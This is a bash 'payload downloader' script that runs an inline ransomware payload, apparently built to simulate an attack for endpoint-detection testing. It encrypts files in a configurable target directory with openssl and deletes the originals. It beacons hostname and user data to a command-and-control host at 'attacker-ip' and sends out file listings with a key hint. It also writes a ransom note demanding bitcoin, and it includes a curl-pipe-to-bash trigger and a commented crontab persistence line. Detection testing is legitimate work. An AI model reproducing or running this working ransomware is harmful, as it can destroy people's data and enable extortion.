#!/bin/bash
# Payload Downloader: Fetches ransomware from C2 or inline, executes
# Trigger: curl -s http://attacker-ip:8000/payload_downloader.sh | bash

# Embedded operator configuration (base64 encoded .env). `setup.sh` overwrites this value
# when hosting the payload so that remote executions inherit the attacker's desired
# parameters even when the script is streamed via STDIN. When running straight from the
# repository the variable remains empty and normal .env resolution applies.
MOCKBIT_EMBEDDED_ENV_B64="${MOCKBIT_EMBEDDED_ENV_B64:-}"

load_embedded_env() {
    local encoded="$1"
    [[ -z "$encoded" ]] && return 1
    if ! command -v base64 >/dev/null 2>&1; then
        return 1
    fi

    local tmp_env
    tmp_env="$(mktemp)"
    if ! printf '%s' "$encoded" | base64 --decode >"$tmp_env" 2>/dev/null; then
        rm -f "$tmp_env"
        return 1
    fi

    set -a
    # shellcheck disable=SC1090
    source "$tmp_env"
    set +a
    rm -f "$tmp_env"
    return 0
}

load_embedded_env "$MOCKBIT_EMBEDDED_ENV_B64" || true

resolve_env_file() {
    local candidate

    candidate="${ENV_FILE_PATH:-}"
    if [[ -n "$candidate" && -f "$candidate" ]]; then
        printf '%s\n' "$candidate"
        return 0
    fi

    if [[ -f .env ]]; then
        printf '%s\n' "$(pwd)/.env"
        return 0
    fi

    local source_path="${BASH_SOURCE[0]:-$0}"
    if [[ -f "$source_path" ]]; then
        local script_dir
        script_dir="$(cd "$(dirname "$source_path")" 2>/dev/null && pwd)"
        if [[ -n "$script_dir" && -f "$script_dir/.env" ]]; then
            printf '%s\n' "$script_dir/.env"
            return 0
        fi
    fi

    return 1
}

if env_file_path=$(resolve_env_file); then
    set -a
    # shellcheck disable=SC1090
    source "$env_file_path"
    set +a
fi

C2_URL="${C2_URL:-http://attacker-ip:8080}"  # Replace with actual C2 IP
TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"
ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"

RANSOM_URL="${RANSOM_URL:-$C2_URL/ransomware.sh}"  # But inline for self-contained

# Fetch ransomware (or use inline below)
# curl -s "$RANSOM_URL" > /tmp/ransom.sh && chmod +x /tmp/ransom.sh && /tmp/ransom.sh

export C2_URL TARGET_DIR ENCRYPTED_EXT

# Inline ransomware for direct exec (simulates fetch)
RANSOM_PAYLOAD=$(cat << 'EOF'
#!/bin/bash
# Ransomware Core: Encrypts, beacons to C2, exfils fake data
TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"
KEY="ransomkey-$(date +%s)-$(uuidgen | cut -d- -f1)"
IV=$(openssl rand -hex 16)
ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"
C2_ENDPOINT="${C2_URL:-http://attacker-ip:8080}"

# Beacon to C2
beacon_to_c2() {
    curl -s -X POST "$C2_ENDPOINT/beacon" \
         -H "Content-Type: application/json" \
         -d "{\"hostname\": \"$(hostname)\", \"user\": \"$(whoami)\", \"pid\": $$}" >/dev/null
}

# Exfil fake victim data
exfil_data() {
    FAKE_DATA="{\"files\": [$(ls "$TARGET_DIR" | head -5 | sed 's/^/"/;s/$/"/' | paste -sd, )], \"key_hint\": \"$KEY\"}"
    curl -s -X POST "$C2_ENDPOINT/exfil" \
         -H "Content-Type: application/json" \
         -d "$FAKE_DATA" >/dev/null
}

encrypt_file() {
    local file="$1"
    if [[ -f "$file" && ! "${file}" =~ ${ENCRYPTED_EXT}$ ]]; then
        local content=$(cat "$file")
        echo -n "$content" | openssl enc -aes-256-cbc -a -salt -k "$KEY" -iv "$IV" -out "${file}.tmp" >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            if mv "${file}.tmp" "${file}${ENCRYPTED_EXT}"; then
                rm -f "$file"
                echo "Seized: ${file}${ENCRYPTED_EXT}"
                ((seized_count++))
            else
                rm -f "${file}.tmp"
            fi
        else
            rm -f "${file}.tmp"
        fi
    fi
}

# Setup if needed
if [[ ! -d "$TARGET_DIR" ]]; then
    mkdir -p "$TARGET_DIR"
    for i in {1..200}; do
        echo "Critical data $i" > "$TARGET_DIR/critical$i.bin"
    done
fi

# Beacon first
beacon_to_c2
sleep 2  # Simulate delay

# Encrypt bulk
seized_count=0
export -f encrypt_file
export TARGET_DIR KEY IV ENCRYPTED_EXT
find "$TARGET_DIR" -type f ! -name "README.txt" ! -name "*${ENCRYPTED_EXT}" -print0 | xargs -0 -I {} -P 4 bash -c 'encrypt_file "$@"' _ {}
echo "Seized $seized_count assets."

# Ransom note
cat > "$TARGET_DIR/README.txt" << EOR
ASSETS COMPROMISED BY SHADOW OPS
All data seized. Transfer 5 BTC to 1ShadowRansomWallet789abc or permanent wipe.
Recovery hint: Key starts with $KEY
Exfil confirmed to C2.
EOR

# Exfil
exfil_data

# Second beacon
beacon_to_c2

# Persist (optional, for testing)
# crontab -l | { cat; echo "* * * * * $0 --silent"; } | crontab -

echo "Operation complete. Check C2 for beacons/exfils. SentinelOne alerts expected on curl, openssl, file bulk ops."
EOF
)

# Execute ransomware
echo "$RANSOM_PAYLOAD" | bash
# Clean payload trace
rm -f /tmp/ransom.sh
